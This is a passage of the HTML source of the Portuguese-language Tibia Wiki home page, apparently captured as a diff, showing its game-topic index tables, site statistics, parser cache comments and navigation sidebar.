+                     <td style="width:20%;"><a href="/wiki/Montarias" title="Montarias"><img alt="Icone11.png" src="/images/0/09/Icone11.png" decoding="async" width="61" height="73" /></a></td>
+                     <td style="width:20%;"><a href="/wiki/Outfitter" title="Outfitter"><img alt="Outfiter.gif" src="/images/a/a2/Outfiter.gif" decoding="async" width="64" height="64" /></a></td>
+                  </tr>
+                  <tr>
+                     <td style="width:20%;"><a href="/wiki/NPCs" title="NPCs">NPCs</a></td>
+                     <td style="width:20%;"><a href="/wiki/Familiares" title="Familiares">Familiares</a></td>
+                     <td style="width:20%;"><a href="/wiki/Outfits" title="Outfits">Outfits</a></td>
+                     <td style="width:20%;"><a href="/wiki/Montarias" title="Montarias">Montarias</a></td>
+                     <td style="width:20%;"><a href="/wiki/Outfitter" title="Outfitter">Outfitter</a></td>
+                  </tr>
+                  <tr>
+                     <td style="width:20%;"><a href="/wiki/Druid" title="Druid"><img alt="Icone12.png" src="/images/d/d5/Icone12.png" decoding="async" width="64" height="66" /></a></td>
+                     <td style="width:20%;"><a href="/wiki/Knight" title="Knight"><img alt="Icone13.png" src="/images/3/36/Icone13.png" decoding="async" width="47" height="69" /></a></td>
+                     <td style="width:20%;"><a href="/wiki/Paladin" title="Paladin"><img alt="Icone14.png" src="/images/6/65/Icone14.png" decoding="async" width="51" height="57" /></a></td>
+                     <td style="width:20%;"><a href="/wiki/Sorcerer" title="Sorcerer"><img alt="Icone15.png" src="/images/9/96/Icone15.png" decoding="async" width="49" height="62" /></a></td>
+                     <td style="width:20%;"><a href="/wiki/Monk" title="Monk"><img alt="Icone16.png" src="/images/d/d7/Icone16.png" decoding="async" width="49" height="62" /></a></td>
+                  </tr>
+                  <tr>
+                     <td style="width:20%;"><a href="/wiki/Druid" title="Druid">Druids</a></td>
+                     <td style="width:20%;"><a href="/wiki/Knight" title="Knight">Knights</a></td>
+                     <td style="width:20%;"><a href="/wiki/Paladin" title="Paladin">Paladins</a></td>
+                     <td style="width:20%;"><a href="/wiki/Sorcerer" title="Sorcerer">Sorcerers</a></td>
+                     <td style="width:20%;"><a href="/wiki/Monk" title="Monk">Monks</a></td>
+                  </tr>
+               </tbody></table>
+            </div>
+         </div>
+      </td>
+   </tr>
+   <tr>
+      <td colspan="2" style="padding:1px; vertical-align:top; width:69%;">
+         <div style="box-shadow:0 0 .5em #999; border-radius:10px;">
+            <div class="home-box-title">
+               <table style="width:100%;">
+                  <tbody><tr>
+                     <td style="width:5%"><img alt="Tibian Book.gif" src="/images/thumb/4/4c/Tibian_Book.gif/30px-Tibian_Book.gif" decoding="async" width="30" height="30" srcset="/images/thumb/4/4c/Tibian_Book.gif/45px-Tibian_Book.gif 1.5x, /images/thumb/4/4c/Tibian_Book.gif/60px-Tibian_Book.gif 2x" /></td>
+                     <td style="width:95%; padding-left:8px; text-align:left; font-size:105%; font-weight:Bold;">Índice</td>
+                  </tr>
+               </tbody></table>
+            </div>
+            <div style="padding: 20px 20px 20px 6px; border-radius:0px 0px 10px 10px;">
+<table width="100%" style="border-spacing:8px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size:x-small;">
+<tbody><tr>
+<td width="1%">
+<div class="center"><div class="floatnone"><img alt="Tibian Shield.gif" src="/images/thumb/9/97/Tibian_Shield.gif/32px-Tibian_Shield.gif" decoding="async" width="32" height="32" srcset="/images/thumb/9/97/Tibian_Shield.gif/48px-Tibian_Shield.gif 1.5x, /images/9/97/Tibian_Shield.gif 2x" /></div></div>
+</td>
+<td style="width:40%; border-bottom: 1px dashed #AAAAAA;"><b>Tibia Geral</b><br />
+<p><a href="/wiki/Tibia" title="Tibia">Sobre o jogo</a> &#183;
+<a href="/wiki/Guia_Rapido" title="Guia Rapido">Guia Rapido</a> &#183;
+<a href="/wiki/Tibia_Rules" class="mw-redirect" title="Tibia Rules">Regras do Tibia</a> &#183;
+<a href="/wiki/Premium_Account" class="mw-redirect" title="Premium Account">Premium Account</a> &#183;
+<a href="/wiki/Revendedores_Oficiais" title="Revendedores Oficiais">Revendedores Oficiais</a> &#183;
+<a href="/wiki/Servidores" title="Servidores">Servidores</a> &#183;
+<a href="/wiki/Updates_e_Patches" title="Updates e Patches">Updates</a> &#183;
+<a href="/wiki/Fansites" title="Fansites">Fansites</a> &#183;
+<a href="/wiki/Ilustra%C3%A7%C3%B5es_do_Tibia" title="Ilustrações do Tibia">Ilustrações do Tibia</a> &#183;
+<a target="_blank" rel="nofollow noreferrer noopener" class="external text" href="http://portaltibia.com.br/?page_id=2138">Download</a> 
+</p>
+</td>
+<td width="1%">
+<div class="center"><div class="floatnone"><img alt="Librarian.gif" src="/images/thumb/9/9d/Librarian.gif/50px-Librarian.gif" decoding="async" width="50" height="50" srcset="/images/9/9d/Librarian.gif 1.5x" /></div></div>
+</td>
+<td style="width:40%; border-bottom: 1px dashed #AAAAAA;"><b>Biblioteca</b><br />
+<p><a href="/wiki/World_Changes" title="World Changes">World Changes</a> &#183;
+<a href="/wiki/Mini_World_Changes" title="Mini World Changes">Mini World Changes</a> &#183;
+<a href="/wiki/Cooldown" title="Cooldown">Cooldown</a> &#183;
+<a href="/wiki/Constru%C3%A7%C3%B5es" title="Construções">Casas e Guildhalls</a> &#183;
+<a href="/wiki/Sets" title="Sets">Sets</a> &#183;
+<a href="/wiki/Sprites_Duplicados" title="Sprites Duplicados">Sprites Duplicados</a> &#183;
+<a href="/wiki/Cad%C3%A1veres" title="Cadáveres">Cadáveres</a>
+</p>
+</td></tr>
+<tr>
+<td width="1%">
+<div class="center"><div class="floatnone"><img alt="Tome of Knowledge.gif" src="/images/4/47/Tome_of_Knowledge.gif" decoding="async" width="32" height="32" /></div></div>
+</td>
+<td style="width:40%; border-bottom: 1px dashed #AAAAAA;"><b>Entretenimento</b><br />
+<p><a href="/wiki/Voc%C3%AA_sabia%3F" title="Você sabia?">Você sabia?</a> &#183;
+<a href="/wiki/Alus%C3%B5es" title="Alusões">Alusões</a> &#183;
+<a href="/wiki/Bibliotecas" title="Bibliotecas">Livros</a> &#183;
+<a href="/wiki/G%C3%AAnesis" title="Gênesis">Gênesis</a> &#183;
+<a href="/index.php?title=Recordes_do_Tibia&amp;action=edit&amp;redlink=1" class="new" title="Recordes do Tibia (página inexistente)">Recordes</a>
+</p>
+</td>
+<td width="1%">
+<div class="center"><div class="floatnone"><img alt="Blessed Shield.gif" src="/images/1/1f/Blessed_Shield.gif" decoding="async" width="32" height="32" /></div></div>
+</td>
+<td style="width:40%; border-bottom: 1px dashed #AAAAAA;"><b>Equipamentos de Defesa</b><br />
+<p><a href="/wiki/Capacetes" title="Capacetes">Capacetes</a> &#183;
+<a href="/wiki/Armaduras" title="Armaduras">Armaduras</a> &#183;
+<a href="/wiki/Cal%C3%A7as" title="Calças">Calças</a> &#183;
+<a href="/wiki/Botas" title="Botas">Botas</a> &#183;
+<a href="/wiki/Escudos" title="Escudos">Escudos</a> &#183;
+<a href="/wiki/Spellbooks" title="Spellbooks">Spellbooks</a> &#183;
+<a href="/wiki/Aljavas" title="Aljavas">Aljavas</a> &#183;
+<a href="/wiki/Extra_Slot" title="Extra Slot">Extra Slot</a>
+</p>
+</td></tr>
+<tr>
+<td width="1%">
+<div class="center"><div class="floatnone"><img alt="Thunder Hammer.gif" src="/images/e/e1/Thunder_Hammer.gif" decoding="async" width="32" height="32" /></div></div>
+</td>
+<td style="width:40%; border-bottom: 1px dashed #AAAAAA;"><b>Armas</b><br />
+<p><a href="/wiki/Espadas" title="Espadas">Espadas</a> &#183;
+<a href="/wiki/Clavas" title="Clavas">Clavas</a> &#183;
+<a href="/wiki/Machados" title="Machados">Machados</a> &#183;
+<a href="/wiki/Dist%C3%A2ncia" title="Distância">Distância</a> &#183;
+<a href="/wiki/Muni%C3%A7%C3%A3o" title="Munição">Munição</a> &#183;
+<a href="/wiki/Wands" title="Wands">Wands</a> &#183;
+<a href="/wiki/Rods" title="Rods">Rods</a> &#183;
+<a href="/wiki/Punhos" title="Punhos">Punhos</a>
+</p>
+</td>
+<td width="1%">
+<div class="center"><div class="floatnone"><img alt="Bricklayers&#39; Kit.gif" src="/images/thumb/b/b2/Bricklayers%27_Kit.gif/32px-Bricklayers%27_Kit.gif" decoding="async" width="32" height="26" srcset="/images/b/b2/Bricklayers%27_Kit.gif 1.5x" /></div></div>
+</td>
+<td style="width:40%; border-bottom: 1px dashed #AAAAAA;"><b>Ferramentas e Outros Equipamentos</b><br />
+<p><a href="/wiki/Amuletos_e_Colares" title="Amuletos e Colares">Amuletos e Colares</a> &#183;
+<a href="/wiki/An%C3%A9is" title="Anéis">Anéis</a> &#183;
+<a href="/wiki/Chaves" title="Chaves">Chaves</a> &#183;
+<a href="/wiki/Fontes_de_Luz" title="Fontes de Luz">Fontes de Luz</a> &#183;
+<a href="/wiki/Ferramentas" title="Ferramentas">Ferramentas</a> &#183;
+<a href="/wiki/Itens_de_Domar" title="Itens de Domar">Itens de Domar</a>
+</p>
+</td></tr>
+<tr>
+<td width="1%">
+<div class="center"><div class="floatnone"><img alt="Miniature House.gif" src="/images/thumb/d/d0/Miniature_House.gif/50px-Miniature_House.gif" decoding="async" width="50" height="50" srcset="/images/d/d0/Miniature_House.gif 1.5x" /></div></div>
+</td>
+<td style="width:40%; border-bottom: 1px dashed #AAAAAA;"><b>Itens de Decoração</b><br />
+<p><a href="/wiki/Livros" title="Livros">Livros</a> &#183;
+<a href="/wiki/Recipientes" title="Recipientes">Recipientes</a> &#183;
+<a href="/wiki/Decora%C3%A7%C3%A3o" class="mw-redirect" title="Decoração">Decoração</a> &#183;
+<a href="/wiki/Documentos_e_Pap%C3%A9is" title="Documentos e Papéis">Documentos e Papéis</a> &#183;
+<a href="/wiki/Dolls_e_Bears" title="Dolls e Bears">Dolls e Bears</a> &#183;
+<a href="/wiki/M%C3%B3veis" title="Móveis">Móveis</a> &#183;
+<a href="/wiki/Ferramentas_de_Cozinha" title="Ferramentas de Cozinha">Ferramentas de Cozinha</a> &#183;
+<a href="/wiki/Instrumentos_Musicais" title="Instrumentos Musicais">Instrumentos Musicais</a>
+</p>
+</td>
+<td width="1%">
+<div class="center"><div class="floatnone"><img alt="Tree (Summer Court).gif" src="/images/thumb/f/f0/Tree_%28Summer_Court%29.gif/50px-Tree_%28Summer_Court%29.gif" decoding="async" width="50" height="50" srcset="/images/f/f0/Tree_%28Summer_Court%29.gif 1.5x" /></div></div>
+</td>
+<td style="width:40%; border-bottom: 1px dashed #AAAAAA;"><b>Plantas, Produtos de Animais, Bebidas e Comida</b><br />
+<p><a href="/wiki/Produtos_de_Criaturas" title="Produtos de Criaturas">Produtos de Criaturas</a> &#183;
+<a href="/wiki/Comida" class="mw-redirect" title="Comida">Comida</a> &#183;
+<a href="/wiki/L%C3%ADquidos" title="Líquidos">Líquidos</a> &#183;
+<a href="/wiki/Plantas_e_Ervas" title="Plantas e Ervas">Plantas e Ervas</a>
+</p>
+</td></tr>
+<tr>
+<td width="1%">
+<div class="center"><div class="floatnone"><img alt="Noble Amulet.gif" src="/images/b/b3/Noble_Amulet.gif" decoding="async" width="32" height="32" /></div></div>
+</td>
+<td style="width:40%;"><b>Outros Itens</b><br />
+<p><a href="/wiki/Itens_de_Addons" title="Itens de Addons">Itens de Addons</a> &#183;
+<a href="/wiki/Itens_de_Imbuements" title="Itens de Imbuements">Itens de Imbuements</a> &#183;
+<a href="/wiki/Itens_Encantados" class="mw-redirect" title="Itens Encantados">Itens Encantados</a> &#183;
+<a href="/wiki/Jogos_e_Divers%C3%A3o" title="Jogos e Diversão">Jogos e Diversão</a> &#183;
+<a href="/wiki/Itens_de_Festa" title="Itens de Festa">Itens de Festa</a> &#183;
+<a href="/wiki/Itens_de_Quest" title="Itens de Quest">Itens de Quest</a> &#183;
+<a href="/wiki/Runas" title="Runas">Runas</a> &#183;
+<a href="/wiki/Lixo" class="mw-redirect" title="Lixo">Lixo</a> &#183;
+<a href="/wiki/Valiosos" title="Valiosos">Valiosos</a>
+</p>
+</td>
+<td width="1%">
+<div class="center"><div class="floatnone"><img alt="Gilded Imbuing Shrine.gif" src="/images/thumb/5/53/Gilded_Imbuing_Shrine.gif/50px-Gilded_Imbuing_Shrine.gif" decoding="async" width="50" height="50" srcset="/images/5/53/Gilded_Imbuing_Shrine.gif 1.5x" /></div></div>
+</td>
+<td style="width:40%;"><b>Funcionalidades</b><br />
+<p><a href="/wiki/Store" title="Store">Store</a> &#183;
+<a href="/wiki/Mercado" title="Mercado">Mercado</a> &#183;
+<a href="/wiki/Outfitter" title="Outfitter">Outfitter</a> &#183;
+<a href="/wiki/Invas%C3%B5es" title="Invasões">Invasões</a> &#183;
+<a href="/wiki/Newly_Wed_Outfits_Quest" title="Newly Wed Outfits Quest">Casamentos</a> &#183;
+<a href="/wiki/Arena_PvP" title="Arena PvP">Arena PvP</a> &#183;
+<a href="/wiki/Skull_System" title="Skull System">Sistema de Caveiras</a> &#183;
+<a href="/wiki/War_System" title="War System">Sistema de Guerras</a> &#183;
+<a href="/wiki/Sistema_de_Lealdade" title="Sistema de Lealdade">Sistema de Lealdade</a> &#183;
+<a href="/wiki/Tibia_Client" class="mw-redirect" title="Tibia Client">Tibia Client</a> &#183;
+<a href="/wiki/Imbuement_Tool" title="Imbuement Tool">Imbuement Tool</a>
+</p>
+</td></tr></tbody></table></div>
+         </div>
+      </td>
+   </tr>
+   <tr>
+      <td colspan="2" style="vertical-align:top; width:69%;">
+         <div style="box-shadow:0 0 .5em #999; border-radius:10px;">
+            <div style="padding: 20px 30px 20px 0px;"><table style="margin:0 auto"><tbody><tr><td style="text-align:center"><b><a href="/wiki/Especial:Estat%C3%ADsticas" title="Especial:Estatísticas">Estatísticas Tibia Wiki</a></b><br /><small><b>17&#160;766 <a href="/wiki/Especial:Todas_as_p%C3%A1ginas" title="Especial:Todas as páginas">Artigos</a> - 29&#160;264 <a href="/wiki/Especial:Registro/upload" title="Especial:Registro/upload">Arquivos Carregados</a> - 15&#160;253 <a href="/wiki/Especial:Lista_de_usu%C3%A1rios" title="Especial:Lista de usuários">Usuários Registrados</a> e 426&#160;999  <a href="/wiki/Especial:Mudan%C3%A7as_recentes" title="Especial:Mudanças recentes">Edições</a> </b></small><br />
+<hr />
+<b>Sites Oficiais</b>:<br /><b><small><a target="_blank" rel="nofollow noreferrer noopener" class="external text" href="https://www.tibia.com">Tibia.com</a> - <a target="_blank" rel="nofollow noreferrer noopener" class="external text" href="https://www.portaltibia.com.br">Portal Tibia</a> - <a target="_blank" rel="nofollow noreferrer noopener" class="external text" href="http://forum.portaltibia.com.br">Fórum Portal Tibia</a> - <a target="_blank" rel="nofollow noreferrer noopener" class="external text" href="https://www.facebook.com/tibiawikibr">Facebook</a> - <a target="_blank" rel="nofollow noreferrer noopener" class="external text" href="https://www.twitter.com/PortalTibia">Twitter</a> - <a target="_blank" rel="nofollow noreferrer noopener" class="external text" href="https://www.instagram.com/tibiawiki">Instagram</a> - <a target="_blank" rel="nofollow noreferrer noopener" class="external text" href="https://discord.gg/uVqKzHZsVr">Discord</a></small></b></td></tr></tbody></table></div>
+         </div>
+      </td>
+   </tr>
+</tbody></table>
+<p><br />
+</p>
+<!-- 
+NewPP limit report
+Cached time: 20260507134443
+Cache expiry: 3600
+Reduced expiry: true
+Complications: []
+CPU time usage: 0.088 seconds
+Real time usage: 0.469 seconds
+Preprocessor visited node count: 302/1000000
+Post‐expand include size: 5390/2097152 bytes
+Template argument size: 0/2097152 bytes
+Highest expansion depth: 4/100
+Expensive parser function count: 0/150
+Unstrip recursion depth: 0/20
+Unstrip post‐expand size: 0/5000000 bytes
+-->
+<!--
+Transclusion expansion time report (%,ms,calls,template)
+100.00%   58.405      1 -total
+ 36.92%   21.565      1 Predefinição:Evento_em_destaque
+ 28.80%   16.818      1 Predefinição:Índice
+ 20.53%   11.989      1 Predefinição:Rashid_Home
+ 13.25%    7.739      1 Predefinição:Estatísticas
+-->
+
+<!-- Saved in parser cache with key tibiawiki-tibiawi_elite:pcache:idhash:78-0!canonical and timestamp 20260507134443 and revision id 435094.
+ -->
+</div>
+<div class="printfooter" data-nosnippet="">Disponível em “<a dir="ltr" href="https://www.tibiawiki.com.br/index.php?title=Home&amp;oldid=435094">https://www.tibiawiki.com.br/index.php?title=Home&amp;oldid=435094</a>”</div></div>
+		<div id="catlinks" class="catlinks catlinks-allhidden" data-mw="interface"></div>
+	</div>
+</div>
+
+<div id="mw-navigation">
+	<h2>Menu de navegação</h2>
+	<div id="mw-head">
+		
+
+<nav id="p-personal" class="vector-menu mw-portlet mw-portlet-personal vector-user-menu-legacy" aria-labelledby="p-personal-label" role="navigation"  >
+	<h3
+		id="p-personal-label"
+		
+		class="vector-menu-heading "
+	>
+		<span class="vector-menu-heading-label">Ferramentas pessoais</span>
+	</h3>
+	<div class="vector-menu-content">
+		
+		<ul class="vector-menu-content-list"><li id="pt-createaccount" class="mw-list-item"><a href="/index.php?title=Especial:Criar_conta&amp;returnto=Home" title="É recomendado que você crie uma conta e inicie uma seção; todavia, isto não é obrigatório"><span>Crie uma conta</span></a></li><li id="pt-login" class="mw-list-item"><a href="/index.php?title=Especial:Autenticar-se&amp;returnto=Home" title="Você é encorajado a autenticar-se; no entanto, não é obrigatório [o]" accesskey="o"><span>Entrar</span></a></li></ul>
+		
+	</div>
+</nav>
+
+		<div id="left-navigation">
+			
+
+<nav id="p-namespaces" class="vector-menu mw-portlet mw-portlet-namespaces vector-menu-tabs vector-menu-tabs-legacy" aria-labelledby="p-namespaces-label" role="navigation"  >
+	<h3
+		id="p-namespaces-label"
+		
+		class="vector-menu-heading "
+	>
+		<span class="vector-menu-heading-label">Espaços nominais</span>
+	</h3>
+	<div class="vector-menu-content">
+		
+		<ul class="vector-menu-content-list"><li id="ca-nstab-main" class="selected mw-list-item"><a href="/wiki/Home" title="Ver a página de conteúdo [c]" accesskey="c"><span>Página principal</span></a></li><li id="ca-talk" class="mw-list-item"><a href="/wiki/Discuss%C3%A3o:Home" rel="discussion" title="Discussão sobre o conteúdo da página [t]" accesskey="t"><span>Discussão</span></a></li></ul>
+		
+	</div>
+</nav>
+
+			
+
+<nav id="p-variants" class="vector-menu mw-portlet mw-portlet-variants emptyPortlet vector-menu-dropdown" aria-labelledby="p-variants-label" role="navigation"  >
+	<input type="checkbox"
+		id="p-variants-checkbox"
+		role="button"
+		aria-haspopup="true"
+		data-event-name="ui.dropdown-p-variants"
+		class="vector-menu-checkbox"
+		aria-labelledby="p-variants-label"
+	/>
+	<label
+		id="p-variants-label"
+		 aria-label="Alterar a variante de idioma"
+		class="vector-menu-heading "
+	>
+		<span class="vector-menu-heading-label">português do Brasil</span>
+	</label>
+	<div class="vector-menu-content">
+		
+		<ul class="vector-menu-content-list"></ul>
+		
+	</div>
+</nav>
+
+		</div>
+		<div id="right-navigation">
+			
+
+<nav id="p-views" class="vector-menu mw-portlet mw-portlet-views vector-menu-tabs vector-menu-tabs-legacy" aria-labelledby="p-views-label" role="navigation"  >
+	<h3
+		id="p-views-label"
+		
+		class="vector-menu-heading "
+	>
+		<span class="vector-menu-heading-label">Visualizações</span>
+	</h3>
+	<div class="vector-menu-content">
+		
+		<ul class="vector-menu-content-list"><li id="ca-view" class="selected mw-list-item"><a href="/wiki/Home"><span>Ler</span></a></li><li id="ca-viewsource" class="mw-list-item"><a href="/index.php?title=Home&amp;action=edit" title="Esta página está protegida.&#10;Você pode, no entanto, visualiar seu código-fonte. [e]" accesskey="e"><span>Ver código-fonte</span></a></li><li id="ca-history" class="mw-list-item"><a href="/index.php?title=Home&amp;action=history" title="Edições anteriores desta página [h]" accesskey="h"><span>Ver histórico</span></a></li></ul>
+		
+	</div>
+</nav>
+
+			
+
+<nav id="p-cactions" class="vector-menu mw-portlet mw-portlet-cactions emptyPortlet vector-menu-dropdown" aria-labelledby="p-cactions-label" role="navigation"  title="Mais opções" >
+	<input type="checkbox"
+		id="p-cactions-checkbox"
+		role="button"
+		aria-haspopup="true"
+		data-event-name="ui.dropdown-p-cactions"
+		class="vector-menu-checkbox"
+		aria-labelledby="p-cactions-label"
+	/>
+	<label
+		id="p-cactions-label"
+		
+		class="vector-menu-heading "
+	>
+		<span class="vector-menu-heading-label">Mais</span>
+	</label>
+	<div class="vector-menu-content">
+		
+		<ul class="vector-menu-content-list"></ul>
+		
+	</div>
+</nav>
+
+			
+<div id="p-search" role="search" class="vector-search-box-vue  vector-search-box-show-thumbnail vector-search-box-auto-expand-width vector-search-box">
+	<div>
+			<h3 >
+				<label for="searchInput">Pesquisa</label>
+			</h3>
+		<form action="/index.php" id="searchform"
+			class="vector-search-box-form">
+			<div id="simpleSearch"
+				class="vector-search-box-inner"
+				 data-search-loc="header-navigation">
+				<input class="vector-search-box-input"
+					 type="search" name="search" placeholder="Pesquisar em Tibia Wiki - A Enciclopédia do Tibia" aria-label="Pesquisar em Tibia Wiki - A Enciclopédia do Tibia" autocapitalize="sentences" title="O que você está procurando? [f]" accesskey="f" id="searchInput"
+				>
+				<input type="hidden" name="title" value="Especial:Busca">
+				<input id="mw-searchButton"
+					 class="searchButton mw-fallbackSearchButton" type="submit" name="fulltext" title="Procurar páginas que contenham este texto" value="Pesquisar">
+				<input id="searchButton"
+					 class="searchButton" type="submit" name="go" title="Ir a uma página com este exato nome, caso exista" value="Ir">
+			</div>
+		</form>
+	</div>
+</div>
+
+		</div>
+	</div>
+	
+
+<div id="mw-panel">
+	<div id="p-logo" role="banner">
+		<a class="mw-wiki-logo" href="/wiki/Home"
+			title="Acessar a página principal"></a>
+	</div>
+	
+
+<nav id="p-Acesso_Rápido" class="vector-menu mw-portlet mw-portlet-Acesso_Rápido vector-menu-portal portal" aria-labelledby="p-Acesso_Rápido-label" role="navigation"  >
+	<h3
+		id="p-Acesso_Rápido-label"
+		
+		class="vector-menu-heading "
+	>
+		<span class="vector-menu-heading-label">Acesso Rápido</span>
+	</h3>
+	<div class="vector-menu-content">
+		
+		<ul class="vector-menu-content-list"><li id="n-Home" class="mw-list-item"><a href="/wiki/Home"><span>Home</span></a></li><li id="n-recentchanges" class="mw-list-item"><a href="/wiki/Especial:Mudan%C3%A7as_recentes" title="Uma lista de mudanças recentes nesta wiki [r]" accesskey="r"><span>Mudanças recentes</span></a></li><li id="n-randompage" class="mw-list-item"><a href="/wiki/Especial:Aleat%C3%B3ria" title="Acessar uma página de forma aleatória [x]" accesskey="x"><span>Página aleatória</span></a></li><li id="n-Rank-Editores" class="mw-list-item"><a href="/wiki/Especial:TopUsers"><span>Rank Editores</span></a></li><li id="n-Contato" class="mw-list-item"><a href="/wiki/Tibia_Wiki:Contato"><span>Contato</span></a></li></ul>
+		
+	</div>
+</nav>
+
+	
+
+<nav id="p-Sobre_Tibia" class="vector-menu mw-portlet mw-portlet-Sobre_Tibia vector-menu-portal portal" aria-labelledby="p-Sobre_Tibia-label" role="navigation"  >
+	<h3
+		id="p-Sobre_Tibia-label"
+		
+		class="vector-menu-heading "
+	>
+		<span class="vector-menu-heading-label">Sobre Tibia</span>
+	</h3>
+	<div class="vector-menu-content">
+		
+		<ul class="vector-menu-content-list"><li id="n-O-que-é-Tibia" class="mw-list-item"><a href="/wiki/O_que_%C3%A9_Tibia"><span>O que é Tibia</span></a></li><li id="n-Guia-Rapido" class="mw-list-item"><a href="/wiki/Guia_Rapido"><span>Guia Rapido</span></a></li><li id="n-Dicas-de-Segurança" class="mw-list-item"><a href="/wiki/Dicas_de_Seguran%C3%A7a"><span>Dicas de Segurança</span></a></li></ul>
+		
+	</div>
+</nav>
+
+
+<nav id="p-Cyclopedia" class="vector-menu mw-portlet mw-portlet-Cyclopedia vector-menu-portal portal" aria-labelledby="p-Cyclopedia-label" role="navigation"  >
+	<h3
+		id="p-Cyclopedia-label"
+		
+		class="vector-menu-heading "
+	>
+		<span class="vector-menu-heading-label">Cyclopedia</span>
+	</h3>
+	<div class="vector-menu-content">
+		
+		<ul class="vector-menu-content-list"><li id="n-Itens" class="mw-list-item"><a href="/wiki/Itens"><span>Itens</span></a></li><li id="n-Bestiary" class="mw-list-item"><a href="/wiki/Besti%C3%A1rio"><span>Bestiary</span></a></li><li id="n-Charms" class="mw-list-item"><a href="/wiki/Charms"><span>Charms</span></a></li><li id="n-Mapa" class="mw-list-item"><a href="/wiki/Mapa"><span>Mapa</span></a></li><li id="n-Casas" class="mw-list-item"><a href="/wiki/Todas_as_casas"><span>Casas</span></a></li><li id="n-Guildhalls" class="mw-list-item"><a href="/wiki/Todas_as_guildhalls"><span>Guildhalls</span></a></li><li id="n-Bosstiary" class="mw-list-item"><a href="/wiki/Bossti%C3%A1rio"><span>Bosstiary</span></a></li><li id="n-Store" class="mw-list-item"><a href="/wiki/Store"><span>Store</span></a></li><li id="n-Magical-Archive" class="mw-list-item"><a href="/wiki/Magical_Archive"><span>Magical Archive</span></a></li></ul>
+		
+	</div>
+</nav>
+
+
+<nav id="p-Utilidades" class="vector-menu mw-portlet mw-portlet-Utilidades vector-menu-portal portal" aria-labelledby="p-Utilidades-label" role="navigation"  >
+	<h3
+		id="p-Utilidades-label"
+		
+		class="vector-menu-heading "
+	>
+		<span class="vector-menu-heading-label">Utilidades</span>
+	</h3>
+	<div class="vector-menu-content">
+		
+		<ul class="vector-menu-content-list"><li id="n-Calculadoras" class="mw-list-item"><a href="/wiki/Calculadoras"><span>Calculadoras</span></a></li><li id="n-Imbuement-Tool" class="mw-list-item"><a href="/wiki/Imbuement_Tool"><span>Imbuement Tool</span></a></li><li id="n-Outfitter" class="mw-list-item"><a href="/wiki/Outfitter"><span>Outfitter</span></a></li></ul>
+		
+	</div>
+</nav>
+
+
+<nav id="p-Menu" class="vector-menu mw-portlet mw-portlet-Menu vector-menu-portal portal" aria-labelledby="p-Menu-label" role="navigation"  >
+	<h3
+		id="p-Menu-label"
+		
+		class="vector-menu-heading "
+	>
+		<span class="vector-menu-heading-label">Menu</span>
+	</h3>
+	<div class="vector-menu-content">
+		
+		<ul class="vector-menu-content-list"><li id="n-Achievements" class="mw-list-item"><a href="/wiki/Achievements"><span>Achievements</span></a></li><li id="n-Bibliotecas" class="mw-list-item"><a href="/wiki/Bibliotecas"><span>Bibliotecas</span></a></li><li id="n-Cidades" class="mw-list-item"><a href="/wiki/Cidades"><span>Cidades</span></a></li><li id="n-Construções" class="mw-list-item"><a href="/wiki/Constru%C3%A7%C3%B5es"><span>Construções</span></a></li><li id="n-Criaturas" class="mw-list-item"><a href="/wiki/Criaturas"><span>Criaturas</span></a></li><li id="n-Locais-de-Caça" class="mw-list-item"><a href="/wiki/Locais_de_Ca%C3%A7a"><span>Locais de Caça</span></a></li><li id="n-Magias" class="mw-list-item"><a href="/wiki/Magias_Instant%C3%A2neas"><span>Magias</span></a></li><li id="n-Mini-World-Changes" class="mw-list-item"><a href="/wiki/Mini_World_Changes"><span>Mini World Changes</span></a></li><li id="n-Montarias" class="mw-list-item"><a href="/wiki/Montarias"><span>Montarias</span></a></li><li id="n-NPCs" class="mw-list-item"><a href="/wiki/NPCs"><span>NPCs</span></a></li><li id="n-Objetos" class="mw-list-item"><a href="/wiki/Objetos"><span>Objetos</span></a></li><li id="n-Outfits" class="mw-list-item"><a href="/wiki/Outfits"><span>Outfits</span></a></li><li id="n-Quests" class="mw-list-item"><a href="/wiki/Quests"><span>Quests</span></a></li><li id="n-Runas" class="mw-list-item"><a href="/wiki/Runas"><span>Runas</span></a></li><li id="n-Servidores" class="mw-list-item"><a href="/wiki/Servidores"><span>Servidores</span></a></li><li id="n-Tasks-Diárias" class="mw-list-item"><a href="/wiki/Tarefas_Di%C3%A1rias"><span>Tasks Diárias</span></a></li><li id="n-Tibiadrome" class="mw-list-item"><a href="/wiki/Tibiadrome"><span>Tibiadrome</span></a></li><li id="n-Updates" class="mw-list-item"><a href="/wiki/Updates_e_Patches"><span>Updates</span></a></li><li id="n-World-Changes" class="mw-list-item"><a href="/wiki/World_Changes"><span>World Changes</span></a></li><li id="n-World-Quests" class="mw-list-item"><a href="/wiki/World_Quests"><span>World Quests</span></a></li></ul>
+		
+	</div>
+</nav>
+
+
+<nav id="p-tb" class="vector-menu mw-portlet mw-portlet-tb vector-menu-portal portal" aria-labelledby="p-tb-label" role="navigation"  >
+	<h3
+		id="p-tb-label"
+		
+		class="vector-menu-heading "
+	>
+		<span class="vector-menu-heading-label">Ferramentas</span>
+	</h3>
+	<div class="vector-menu-content">
+		
+		<ul class="vector-menu-content-list"><li id="t-whatlinkshere" class="mw-list-item"><a href="/wiki/Especial:P%C3%A1ginas_afluentes/Home" title="Lista de todas as páginas que possuem links para esta [j]" accesskey="j"><span>Páginas afluentes</span></a></li><li id="t-recentchangeslinked" class="mw-list-item"><a href="/wiki/Especial:Mudan%C3%A7as_relacionadas/Home" rel="nofollow" title="Mudanças recentes nas páginas para as quais esta possui links [k]" accesskey="k"><span>Mudanças relacionadas</span></a></li><li id="t-specialpages" class="mw-list-item"><a href="/wiki/Especial:P%C3%A1ginas_especiais" title="Lista de páginas especiais [q]" accesskey="q"><span>Páginas especiais</span></a></li><li id="t-print" class="mw-list-item"><a href="javascript:print();" rel="alternate" title="Versão para impressão desta página [p]" accesskey="p"><span>Versão para impressão</span></a></li><li id="t-permalink" class="mw-list-item"><a href="/index.php?title=Home&amp;oldid=435094" title="Link permanente para esta revisão desta página"><span>Link permanente</span></a></li><li id="t-info" class="mw-list-item"><a href="/index.php?title=Home&amp;action=info" title="Mais informações sobre esta página"><span>Informações da página</span></a></li></ul>
+		
+	</div>
+</nav>
+
+	
+<!-- banner lateral esquerda 160x600 ou 120x600 -->
+<br><center>
+<div data-premium="" data-adunit="TIBIA_WIKI_LATERAL_ESQUERDA" data-sizes-desktop="[[160,600],[120,600]]" data-sizes-mobile="[[160,600],[120,600]]" ></div>	
+</center><br>
